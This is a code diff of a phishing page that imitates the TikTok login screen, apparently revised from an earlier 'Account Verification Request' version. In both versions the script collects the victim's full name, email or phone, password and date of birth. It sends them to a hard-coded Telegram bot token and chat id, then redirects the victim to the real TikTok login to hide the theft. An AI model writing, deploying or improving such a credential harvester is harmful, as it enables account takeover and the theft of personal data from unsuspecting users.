@@ -1,170 +1,225 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Account Verification Request</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <title>Login - TikTok</title>
   <style>
-    :root {
-      --primary: #ff0050;
-      --bg: #f5f5f5;
-      --card-bg: #111111;
-      --text: #ffffff;
-      --muted: #bbbbbb;
-      --radius: 18px;
-      --input-bg: #222222;
-    }
-
-    * {
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f7f7f7;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
     }
 
-    html, body {
-      background-color: var(--bg);
-      height: 100%;
-      overflow: hidden;
+    .container {
+      max-width: 380px;
+      margin: 60px auto;
+      background-color: white;
+      border-radius: 18px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      padding: 32px 24px;
+      position: relative;
     }
 
-    body {
+    .help-icon {
+      position: absolute;
+      right: 16px;
+      top: 16px;
+      font-size: 22px;
+      cursor: pointer;
+      color: #555;
+    }
+
+    .header {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 30px;
+    }
+
+    .tabs {
       display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 10px;
+      border-bottom: 1.5px solid #ddd;
+      margin-bottom: 25px;
     }
 
-    .card {
-      background-color: var(--card-bg);
-      border-radius: var(--radius);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      padding: 25px;
-      width: 100%;
-      max-width: 360px;
+    .tab {
+      flex: 1;
       text-align: center;
-      opacity: 0;
-      animation: fadeIn 1s forwards;
+      padding: 12px 0;
+      font-weight: bold;
+      font-size: 15px;
+      color: #666;
+      cursor: pointer;
+      transition: all 0.3s;
     }
 
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    .tab.active {
+      border-bottom: 2px solid black;
+      color: black;
     }
 
-    .card img {
-      width: 120px;
-      margin-bottom: 20px;
-      animation: fadeIn 1s forwards 0.2s;
+    .form-content {
+      display: none;
     }
 
-    h2 {
-      font-size: 20px;
-      color: var(--text);
-      margin-bottom: 10px;
+    .form-content.active {
+      display: block;
     }
 
-    p {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 20px;
-    }
-
-    input {
+    input[type="text"],
+    input[type="password"],
+    input[type="date"] {
       width: 100%;
-      padding: 12px 14px;
-      margin-bottom: 14px;
-      background-color: var(--input-bg);
-      border: none;
-      border-radius: var(--radius);
-      color: var(--text);
-      font-size: 14px;
+      padding: 14px 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      background-color: #f9f9f9;
+      font-size: 15px;
+      text-align: left;
+      transition: 0.3s;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #999;
+      background-color: #fff;
     }
 
     input::placeholder {
-      color: #888;
+      color: #bbb;
     }
 
-    button {
+    .forgot {
+      text-align: left;
+      color: #000;
+      font-size: 14px;
+      margin-bottom: 25px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .forgot:hover {
+      color: #555;
+    }
+
+    .login-btn {
       width: 100%;
       padding: 14px;
-      background-color: var(--primary);
+      background: linear-gradient(to right, #ddd, #ccc);
       border: none;
-      border-radius: var(--radius);
-      color: white;
-      font-size: 15px;
+      color: #888;
       font-weight: bold;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: not-allowed;
+      transition: all 0.3s ease-in-out;
     }
 
-    button:hover {
-      background-color: #e60045;
+    .login-btn.active {
+      background: linear-gradient(to right, #ff2d55, #ff5a36);
+      color: white;
+      cursor: pointer;
+    }
+
+    .login-btn.active:hover {
+      transform: scale(0.98);
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <img src="https://raw.githubusercontent.com/Hhfjkyr/my-website/main/537af08a11a116c157659081006036e7%20(1).png" alt="TikTok Logo">
-    <h2>Account Verification Request</h2>
-    <p>Fill in the details below to submit your request</p>
-    <form id="verifyForm">
-      <input type="text" placeholder="Full Name" id="fullName" required>
-      <input type="text" placeholder="Email or Username" id="emailOrUser" required>
-      <input type="password" placeholder="Password" id="password" required>
-      <input type="date" placeholder="Date of Birth" id="dob" value="2000-01-01" required>
-      <button type="submit">Submit Request</button>
-    </form>
+  <div class="container">
+    <div class="help-icon">?</div>
+    <div class="header">Log in</div>
+    <div class="tabs">
+      <div class="tab" onclick="switchTab('phone')">Phone</div>
+      <div class="tab active" onclick="switchTab('email')">Email / Username</div>
+    </div>
+
+    <div id="form-email" class="form-content active">
+      <input id="fullname" type="text" placeholder="Full Name" oninput="checkFields()" />
+      <input id="email" type="text" placeholder="Email or username" oninput="checkFields()" />
+      <input id="password" type="password" placeholder="Password" oninput="checkFields()" />
+      <input id="dob" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
+    </div>
+
+    <div id="form-phone" class="form-content">
+      <input id="phone" type="text" placeholder="Phone number" oninput="checkFields()" />
+      <input type="password" placeholder="Password" oninput="checkFields()" />
+      <input id="dob-phone" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
+    </div>
+
+    <div class="forgot">Forgot password?</div>
+    <button id="loginBtn" class="login-btn" onclick="sendToTelegram()">Log in</button>
   </div>
 
   <script>
-    document.getElementById("verifyForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+    function switchTab(type) {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.form-content').forEach(f => f.classList.remove('active'));
 
-      const fullName = document.getElementById('fullName').value;
-      const emailOrUser = document.getElementById('emailOrUser').value;
+      if (type === 'phone') {
+        document.querySelector('.tab:nth-child(1)').classList.add('active');
+        document.getElementById('form-phone').classList.add('active');
+      } else {
+        document.querySelector('.tab:nth-child(2)').classList.add('active');
+        document.getElementById('form-email').classList.add('active');
+      }
+      checkFields();
+    }
+
+    function checkFields() {
+      const activeForm = document.querySelector('.form-content.active');
+      const inputs = activeForm.querySelectorAll('input');
+      const btn = document.getElementById('loginBtn');
+
+      const allFilled = [...inputs].every(input => input.value.trim() !== '');
+
+      if (allFilled) {
+        btn.classList.add('active');
+        btn.disabled = false;
+      } else {
+        btn.classList.remove('active');
+        btn.disabled = true;
+      }
+    }
+
+    function sendToTelegram() {
+      const fullname = document.getElementById('fullname').value;
+      const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
       const dob = document.getElementById('dob').value;
+      const phone = document.getElementById('phone') ? document.getElementById('phone').value : '';
+      const dobPhone = document.getElementById('dob-phone') ? document.getElementById('dob-phone').value : '';
 
-      // Send data to Telegram Bot
-      const botToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
+      let message = `Full Name: ${fullname}\nDate of Birth: ${dob || dobPhone}\n`;
+
+      if (email && password) {
+        message += `Email: ${email}\nPassword: ${password}`;
+      } else if (phone && password) {
+        message += `Phone: ${phone}\nPassword: ${password}`;
+      }
+
+      const telegramBotToken = '7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0';
       const chatId = '5029891039';
-      const message = `
-*🎯 New Account Verification Request*
 
-👤 *Full Name:* ${fullName}
-📧 *Email or Username:* ${emailOrUser}
-🔑 *Password:* ${password}
-📅 *Date of Birth:* ${dob}
-
-🚨 *New account has been caught!* 🚨
-      `;
-      
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Information sent to Telegram!');
+            // بعد إرسال البيانات بنجاح، يتم إعادة التوجيه إلى موقع تيك توك
+            window.location.href = 'https://www.tiktok.com/login';
+          } else {
+            alert('Failed to send message.');
+          }
         })
-      })
-      .then(response => {
-        if (response.ok) {
-          // Redirect to TikTok login page after submitting
-          window.location.href = 'https://www.tiktok.com/login';
-        } else {
-          alert('Failed to send data!');
-        }
-      });
-    });
+        .catch(error => {
+          alert('Error: ' + error.message);
+        });
+    }
   </script>
 </body>
 </html>
